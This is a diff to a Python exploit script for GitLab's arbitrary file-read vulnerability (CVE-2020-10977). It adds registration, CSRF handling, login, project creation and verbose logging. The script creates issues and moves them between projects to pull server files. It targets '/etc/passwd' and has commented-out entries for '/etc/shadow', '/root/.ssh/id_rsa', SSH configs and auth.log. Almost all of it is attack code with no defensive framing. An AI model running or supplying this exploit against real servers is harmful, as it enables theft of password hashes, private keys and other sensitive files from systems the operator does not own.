@@ -19,6 +19,7 @@ class CVE2020_10977:
    
     # get csrf token from page
     def get_csrf_token(self, url):
+        print (LogColors.BLUE + "get csrf token..." + LogColors.ENDC)
         r = self.session.get(
                 self.url + url,
                 headers = self.headers, verify = False
@@ -29,11 +30,37 @@ class CVE2020_10977:
             csrf_token = tree.xpath(".//meta[contains(@name, 'csrf-token')]")[0]
             self.csrf_param = csrf_param.attrib["content"]
             self.csrf_token = csrf_token.attrib["content"]
-            print (LogColors.BLUE + "successfully get csrf token..." + LogColors.ENDC)
+            print (LogColors.YELLOW + self.csrf_token + LogColors.ENDC)
+            print (LogColors.GREEN + "successfully get csrf token..." + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "error get csrf token :(" + LogColors.ENDC)
         return self.csrf_param, self.csrf_token, r.text
+    
+    def register(self):
+        print (LogColors.BLUE + "register new user..." + LogColors.ENDC)
+        print (LogColors.YELLOW + self.username + ":" + self.password + LogColors.ENDC)
+        self.get_csrf_token("/users")
+        data = {
+            'utf8' : '✓',
+            'new_user[name]' : self.username,
+            'new_user[username]' : self.username,
+            'new_user[email]' : self.email,
+            'new_user[email_confirmation]' : self.email,
+            'new_user[password]' : self.password,
+            self.csrf_param : self.csrf_token,
+        }
+        r = self.session.post(url + '/users', data = data, headers = self.headers,
+                allow_redirects = False)
+        if r.status_code == 302:
+            print (LogColors.GREEN + "successfully register new user :)" + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed register new user :(" + LogColors.ENDC)
+            sys.exit()
+
 
     # login to gitlab
     def login(self):
+        print (LogColors.BLUE + "login..." + LogColors.ENDC)
         self.get_csrf_token('/users/sign_in')
         data = {
             'utf8=' : '✓',
@@ -48,15 +75,21 @@ class CVE2020_10977:
                 )
         if r.status_code == 302 and r.text.find("redirected") > -1:
             print (LogColors.GREEN + "successfully log in to giltab..." + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "error logging in :(" + LogColors.ENDC)
 
     # create new project
     def create_project(self, name):
+        print (LogColors.BLUE + "create proj: " + name + LogColors.ENDC)
         [_,_, page] = self.get_csrf_token('/projects/new')
         tree = lxml.html.fromstring(page)
-        namespace = tree.xpath(".//form[contains(@class,'new_project')]" + \
-                "//select[contains(@class, 'namespace')]//options[contains(@data-options-parent), 'users']"
-                )[0]
-        namespace = namespace.attrib["value"]
+        #namespace_select = tree.xpath(".//form[contains(@class,'new_project')]//select[contains(@class, 'namespace')]//options[contains(@data-options-parent), 'users']")
+        namespace_input = tree.xpath(".//form[contains(@class, 'new_project')]//input[contains(@id,'project_namespace_id')]")
+        #if namespace_select:
+        #    namespace = namespace_select[0].attrib["value"]
+        #elif namespace_input:
+        if namespace_input:
+            namespace = namespace_input[0].attrib["value"]
         data = {
             'utf8=' : '✓',
             'project[ci_cd_only]' : 'false',
@@ -72,10 +105,14 @@ class CVE2020_10977:
                 data = data, headers = self.headers, allow_redirects = False, verify = False
             )
         if r.status_code == 302:
-            print (LogColors.BLUE + 'new project {} successfully created...'.format(name) + LogColors.ENDC)
+            print (LogColors.GREEN + 'new project {} successfully created...'.format(name) + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed to create new project" + LogColors.ENDC)
+            sys.exit()
 
     # create new issue with file
     def create_issue(self, project, name, f):
+        print (LogColors.BLUE + "create issue: " + f + " project: " + name + LogColors.ENDC)
         self.issue_url = '/{}/{}/issues/new'.format(self.username, project)
         self.get_csrf_token(self.issue_url)
         
@@ -97,10 +134,13 @@ class CVE2020_10977:
             )
         if r.status_code == 302:
             self.issue_url = r.headers["Location"]
-            print (LogColors.BLUE + 'new issue created {}'.format(self.issue_url) + LogColors.ENDC)
-    
+            print (LogColors.GREEN + 'new issue created {}'.format(self.issue_url) + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed to create new issue :(" + LogColors.ENDC)
+
     # move last issue
     def move_issue(self, source, dest, f):
+        print (LogColors.BLUE + "move issue..." + LogColors.ENDC)
         r = self.session.get(
                 url = self.url + '/{}/{}'.format(self.username, dest),
                 headers = self.headers,
@@ -153,17 +193,18 @@ if __name__ == '__main__':
     username, password = args["username"], args["password"]
     cve = CVE2020_10977(url, username, password)
     cve.login()
-    cve.create_project("exploit_test_proj1")
-    cve.create_project("exploit_test_proj2")
+    #cve.create_project("exploit_test_proj111")
+    #cve.create_project("exploit_test_proj222")
     files = [
+        #'/etc/shadow',
         '/etc/passwd',
-        '/etc/ssh/sshd_config',
-        '/etc/ssh/ssh_config',
-        '/root/.ssh/id_rsa',
-        '/var/log/auth.log',
+        #'/etc/ssh/sshd_config',
+        #'/etc/ssh/ssh_config',
+        #'/root/.ssh/id_rsa',
+        #'/var/log/auth.log',
     ]
     for f in files:
-        cve.create_issue("exploit_test_proj01", "exp_issue_{}".format(f), f)
-        cve.move_issue("exploit_test_proj01", "exploit_test_proj02", f)
+        cve.create_issue("exploit_test_proj111", "exp_issue_{}".format(f), f)
+        cve.move_issue("exploit_test_proj111", "exploit_test_proj222", f)
         time.sleep(5)
 
